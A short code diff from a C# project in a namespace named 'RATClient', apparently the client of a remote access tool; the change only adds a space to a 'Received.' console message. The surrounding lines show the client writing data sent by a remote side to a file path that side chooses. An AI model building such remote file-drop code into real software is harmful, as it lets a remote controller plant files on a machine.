@@ -136,7 +136,7 @@ namespace RATClient
                     try
                     {
                         using (var w = new BinaryWriter(File.OpenWrite(r.Msg))) w.Write(r.Data);
-                        Console.WriteLine(r.Msg + "Received.");
+                        Console.WriteLine(r.Msg + " Received.");
                     }
                     catch (Exception e) { Console.WriteLine(e.Message); }   
                 }
